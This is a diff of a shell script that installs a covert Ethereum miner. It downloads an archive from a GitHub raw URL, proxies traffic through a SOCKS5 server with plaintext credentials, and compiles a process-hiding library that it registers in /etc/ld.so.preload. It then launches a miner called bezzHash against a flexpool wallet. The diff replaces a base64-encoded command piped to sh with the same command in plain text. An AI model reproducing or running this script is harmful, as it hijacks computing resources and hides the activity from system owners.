@@ -2,8 +2,6 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -11,9 +9,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 45.9.154.251:12324
-socks5_username = 14a5029e51675
-socks5_password = 9d332fa7c0
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -23,14 +21,14 @@ sleep .2
 echo " "
 echo " "
 
-echo "******************************************************************"
+echo " "
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo "******************************************************************"
+echo " "
 
 echo " "
 echo " "
@@ -44,4 +42,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8weGJjNDhiOGJkY2U1NzJkZWZlNGRjYWI4NTEwM2YxNDAwOTliYzVhZjUuRE9AZXRoLXVzLXdlc3QuZmxleHBvb2wuaW86NTU1NSAtLWxvZyAtLWV4dHJhIC0tbGF0ZW5jeSAtLWFsbC1zaGFyZXMgLS1zaGFyZXMtZGV0YWlsIC0tc2hvdy1tb2RlIC0tbGlzdC1tb2RlcyAtLW1vZGU9OTk= | sh
+./graftcp/graftcp ./bezzHash --url=ssl://0xbc48b8bdce572defe4dcab85103f140099bc5af5.DO2@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
